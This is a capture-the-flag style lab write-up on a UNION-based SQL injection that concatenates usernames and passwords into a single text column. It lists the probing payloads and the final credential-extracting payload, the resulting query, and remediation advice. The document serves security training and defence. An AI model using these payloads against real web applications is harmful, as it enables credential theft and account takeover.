# Lab 10: SQL Injection - Retrieving Multiple Values in a Single Column

## 🎯 Objective
The goal of this lab was to exploit a UNION-based SQL injection to retrieve the administrator's username and password from the users table. The challenge is that the query only returns one text-compatible column, requiring the attacker to concatenate multiple values into a single string.

## 🔍 Vulnerability Description
The application is vulnerable to a UNION-based SQL injection. When the original query returns multiple columns, but only one is capable of displaying string data, an attacker cannot simply place the username in column 1 and the password in column 2. Instead, they must use string concatenation functions (like || or CONCAT) to combine the data into the single available text column.

## 💥 Exploitation Steps
1. Intercepted the category filter request in Burp Suite Repeater.
2. Determined the query returns 2 columns: ' UNION SELECT NULL, NULL--
3. Found that only the second column is text-compatible: ' UNION SELECT NULL, 'abc'--
4. Used the concatenation operator (||) to combine the username and password into the single text column, using a tilde (~) as a separator.
Payload used: ' UNION SELECT NULL, username || '~' || password FROM users--
5. Located the administrator credentials in the response (e.g., administrator~password123) and logged in.

Resulting Query: SELECT * FROM products WHERE category = '' UNION SELECT NULL, username || '~' || password FROM users--' AND released = 1

## ⚠️ Impact
An attacker can extract all user credentials from the database, even if the application's query structure is restrictive. This leads to a complete account takeover and data breach.

## 🛡️ Remediation (Blue Team Perspective)
Use Parameterized Queries (Prepared Statements) to prevent SQL injection. Additionally, never display raw database output to the user. Limit the database user's permissions and use data encryption at rest.
